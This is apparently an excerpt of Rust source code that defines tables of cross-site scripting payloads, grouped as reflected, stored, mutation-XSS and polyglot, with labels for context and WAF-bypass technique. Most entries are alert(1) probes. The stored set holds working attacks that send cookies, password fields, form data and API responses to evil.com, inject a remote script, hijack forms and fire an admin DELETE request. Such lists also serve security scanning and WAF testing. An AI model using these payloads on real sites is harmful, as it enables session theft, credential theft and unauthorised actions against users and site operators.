...
const REFLECTED_PAYLOADS: &[XssPayload] = &[
    ...
    XssPayload {
        payload: "<details ontoggle open><summary>x</summary></details>",
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Details ontoggle auto-open",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Video source error",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Audio error handler",
    },
    XssPayload {
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Object data javascript protocol",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Embed javascript protocol",
    },
    XssPayload {
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Isindex deprecated tag",
    },
    XssPayload {
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Meta refresh javascript",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Table background javascript",
    },
    XssPayload {
        ...
        waf_bypass: XssWafBypass::None,
        description: "CSS background expression",
    },
    XssPayload {
        payload: "'-alert(1)-'",
        category: XssCategory::Reflected,
        ...
        waf_bypass: XssWafBypass::None,
        description: "JS string breakout with subtraction",
    },
    XssPayload {
        payload: "\\'-alert(1)//",
        category: XssCategory::Reflected,
    ...
    XssPayload {
        ...
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Close existing script context",
    },
    XssPayload {
        payload: "\";alert(1)//",
        category: XssCategory::Reflected,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Double-quote string breakout",
    },
    XssPayload {
        ...
        context: XssContext::Url,
        waf_bypass: XssWafBypass::None,
        description: "Direct javascript protocol in URL",
    },
    XssPayload {
    ...
    XssPayload {
        ...
        waf_bypass: XssWafBypass::None,
        description: "Attribute breakout with onfocus",
    },
    XssPayload {
        payload: "' onfocus=alert(1) autofocus='",
        category: XssCategory::Reflected,
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "Single-quote attribute breakout",
    },
    XssPayload {
        ...
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "Attribute breakout with onmouseover",
    },
    XssPayload {
        payload: "><script>alert(1)</script>",
        category: XssCategory::Reflected,
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "Close tag and inject script",
    },
    XssPayload {
        payload: "\"><img src=x onerror=alert(1)>",
        category: XssCategory::Reflected,
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "Close attribute and inject img",
    },
    ...
    XssPayload {
        ...
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::CaseVariation,
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::TagObfuscation,
        description: "Script tag with slash attribute",
    },
    XssPayload {
        payload: "<img src=x onerror=\"&#97;lert(1)\">",
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::HtmlEntityBypass,
    ...
    XssPayload {
        ...
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::UnicodeEscape,
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::TagObfuscation,
        description: "Slash instead of space",
    },
    XssPayload {
        payload: "<img\tsrc=x\tonerror=alert(1)>",
        category: XssCategory::Reflected,
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::TagObfuscation,
        description: "Newline instead of space",
    },
    XssPayload {
        payload: "<img src=x onerror=alert`1`>",
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::EncodingBypass,
        description: "Template literal instead of parens",
    },
    XssPayload {
        payload: "<svg/onload=alert(1)>",
        category: XssCategory::Reflected,
    ...
    XssPayload {
        ...
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::DoubleEncoding,
    ...
    XssPayload {
        ...
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::JsTemplateString,
        description: "Template string concat bypass",
    },
    XssPayload {
        payload: "<script>\\u0061lert(1)</script>",
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::UnicodeEscape,
        description: "Unicode escape in script body",
    },
    XssPayload {
        payload: "<img src=x onerror=alert(1)//",
        category: XssCategory::Reflected,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::TagObfuscation,
        description: "Comment-style tag close",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::TagObfuscation,
        description: "Custom tag with event handler",
    },
    XssPayload {
        payload: "<math><mi>x</mi><annotation-xml encoding=\"text/html\"><img src=x onerror=alert(1)></annotation-xml></math>",
        category: XssCategory::Reflected,
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "MathML annotation HTML injection",
    },
];
...
const STORED_PAYLOADS: &[XssPayload] = &[
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Cookie exfiltration via redirect",
    },
    XssPayload {
    ...
    XssPayload {
        payload: "<script>navigator.sendBeacon('http://evil.com',document.cookie)</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
    ...
    XssPayload {
        payload: "<svg onload=\"fetch('/api/admin',{method:'DELETE'})\">",
        category: XssCategory::Stored,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "Stored XSS triggering admin action",
    },
    XssPayload {
        payload: "<script>document.querySelector('form').action='http://evil.com'</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Form hijacking",
    },
    XssPayload {
        payload: "<script>setInterval(()=>fetch('http://evil.com/?k='+document.querySelector('input[type=password]')?.value),1000)</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Keylogger via polling",
    },
    XssPayload {
        payload: "<div contenteditable onblur=alert(1)>type here</div>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Contenteditable onblur",
    },
    XssPayload {
    ...
    XssPayload {
        payload: "<link rel=stylesheet href='http://evil.com/xss.css'>",
        category: XssCategory::Stored,
        context: XssContext::Css,
        waf_bypass: XssWafBypass::None,
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "PostMessage listener for persistence",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Base tag hijack",
    },
    XssPayload {
        payload: "<script>document.write('<img src=http://evil.com/?'+document.cookie+'>')</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Document.write exfil",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Textarea autofocus trigger",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Select autofocus trigger",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Keygen autofocus trigger",
    },
    XssPayload {
        payload: "<script>fetch('/api/user').then(r=>r.json()).then(d=>fetch('http://evil.com/?d='+JSON.stringify(d)))</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
    ...
    XssPayload {
        payload: "<script>for(let f of document.forms)f.addEventListener('submit',e=>{fetch('http://evil.com',{method:'POST',body:new FormData(f)})})</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Form data interceptor",
    },
    XssPayload {
        payload: "<script>history.pushState({},'','/');</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "URL masking for phishing",
    },
    XssPayload {
        payload: "<button popovertarget=x>Click</button><div popover id=x onbeforetoggle=alert(1)>pwn</div>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Popover API XSS",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Leak cookie in document title",
    },
    XssPayload {
        payload: "<script>if(document.domain=='admin.target.com'){fetch('http://evil.com/?admin=1')}</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Conditional admin domain exfil",
    },
    XssPayload {
        payload: "<script>Object.defineProperty(document,'cookie',{get:()=>{fetch('http://evil.com')}})</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Cookie getter trap",
    },
    XssPayload {
        payload: "<script>new MutationObserver(m=>fetch('http://evil.com/?m='+btoa(m[0].target.innerHTML))).observe(document.body,{childList:true,subtree:true})</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "DOM mutation observer exfil",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Noscript context injection",
    },
    XssPayload {
        payload: "<script>let s=document.createElement('script');s.src='http://evil.com/hook.js';document.head.appendChild(s)</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "External script injection for persistence",
    },
    XssPayload {
        payload: "<img src=valid.png onload=alert(1)>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Valid image onload trigger",
    },
    XssPayload {
        payload: "<script>crypto.subtle.digest('SHA-256',new TextEncoder().encode(document.cookie)).then(h=>fetch('http://evil.com/?h='+btoa(String.fromCharCode(...new Uint8Array(h)))))</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Hash exfiltration for stealth",
    },
    XssPayload {
        payload: "<svg><use href='data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x'>",
        category: XssCategory::Stored,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
    ...
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Window.name cookie leak cross-tab",
    },
    XssPayload {
        payload: "<script>indexedDB.open('xss').onsuccess=e=>{let db=e.target.result;let tx=db.createObjectStore('d');tx.put(document.cookie,'c')}</script>",
        category: XssCategory::Stored,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
...
const MUTATION_XSS_PAYLOADS: &[XssPayload] = &[
    XssPayload {
        ...
        category: XssCategory::MutationXss,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Noscript mutation bypass",
    },
    XssPayload {
    ...
    XssPayload {
        payload: "<table><caption><svg onload=alert(1)>",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "Table caption SVG foster parenting",
    },
    XssPayload {
        ...
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "MathML mglyph style mutation",
    },
    XssPayload {
        payload: "<form><math><mtext></form><form><mglyph><svg><style></math><img src onerror=alert(1)>",
        category: XssCategory::MutationXss,
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "Form mutation with MathML",
    },
    XssPayload {
        payload: "<svg><style>{font-family:<img/src=x onerror=alert(1)>}",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
    ...
    XssPayload {
        ...
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "MathML mtext integration point",
    },
    XssPayload {
        payload: "<svg><desc><svg onload=alert(1)>",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "SVG desc nested SVG mutation",
    },
    XssPayload {
        payload: "<svg><title><img src=x onerror=alert(1)></title></svg>",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "SVG title integration point",
    },
    XssPayload {
        ...
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "MathML annotation to HTML",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "XMP tag raw text mutation",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Frameset replaces body",
    },
    XssPayload {
        payload: "<table><tr><td><svg><desc><template><img src=x onerror=alert(1)>",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "Table template mutation",
    },
    XssPayload {
        payload: "<div><template><img src=x onerror=alert(1)></template></div>",
        category: XssCategory::MutationXss,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Template content extraction",
    },
    XssPayload {
        ...
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "SVG foreignObject escape",
    },
    XssPayload {
        payload: "<math><mi><table><mglyph><img src=x onerror=alert(1)>",
        category: XssCategory::MutationXss,
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "MathML mi table foster parenting",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Option style parser confusion",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Select template mutation",
    },
    XssPayload {
        payload: "<dl><dt><table><thead><svg onload=alert(1)>",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "Definition list table SVG mutation",
    },
    XssPayload {
        payload: "<ruby><rb><table><rt><svg onload=alert(1)>",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "Ruby element table mutation",
    },
    XssPayload {
        payload: "<p><svg><style><title><img src onerror=alert(1)></title></style></svg>",
        category: XssCategory::MutationXss,
        context: XssContext::Svg,
        waf_bypass: XssWafBypass::None,
        description: "SVG style title escape",
    },
];
...
const POLYGLOT_PAYLOADS: &[XssPayload] = &[
    XssPayload {
        payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        category: XssCategory::Polyglot,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::EncodingBypass,
        description: "Ultimate polyglot payload",
    },
    XssPayload {
        payload: "'\"><img src=x onerror=alert(1)><svg/onload=alert(1)>{{7*7}}${7*7}<%= 7*7 %>",
        category: XssCategory::Polyglot,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Multi-context probe (HTML+template)",
    },
    XssPayload {
        ...
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::EncodingBypass,
        description: "Multi-quote-style breakout",
    },
    XssPayload {
        ...
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Script+img+svg triple payload",
    },
    XssPayload {
        payload: "<math><mtext></mtext><mglyph><svg><style><img src=x onerror=alert(1)>",
        category: XssCategory::Polyglot,
        context: XssContext::MathMl,
        waf_bypass: XssWafBypass::None,
        description: "MathML+SVG namespace polyglot",
    },
    XssPayload {
        ...
        context: XssContext::Url,
        waf_bypass: XssWafBypass::EncodingBypass,
        description: "Context-closing polyglot",
    },
    XssPayload {
        payload: "\"onmouseover=alert(1)//\"onclick=alert(1)//\"onfocus=alert(1) autofocus//\"><script>alert(1)</script>",
        category: XssCategory::Polyglot,
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "Multi-event-handler polyglot",
    },
    XssPayload {
        payload: "'-alert(1)-'\"*alert(1)*\"`-alert(1)-`",
        category: XssCategory::Polyglot,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Multi-quote JS breakout polyglot",
    },
    XssPayload {
        payload: "<svg onload=alert(1)><img src=x onerror=alert(1)><body onload=alert(1)><input onfocus=alert(1) autofocus>",
        category: XssCategory::Polyglot,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Multi-tag auto-trigger polyglot",
    },
    XssPayload {
        payload: "{{constructor.constructor('alert(1)')()}}${alert(1)}<%=alert(1)%><%= system('id') %>",
        category: XssCategory::Polyglot,
        context: XssContext::JavaScriptString,
        waf_bypass: XssWafBypass::None,
        description: "Template engine polyglot",
    },
    XssPayload {
        payload: "\"><svg/onload=alert(1)>'><!--",
        category: XssCategory::Polyglot,
        context: XssContext::Attribute,
        waf_bypass: XssWafBypass::None,
        description: "Attribute breakout with comment",
    },
    XssPayload {
        payload: "-->'\"--><script>alert(1)</script>",
        category: XssCategory::Polyglot,
        context: XssContext::HtmlBody,
        waf_bypass: XssWafBypass::None,
        description: "Comment+attribute escape polyglot",
    },
];
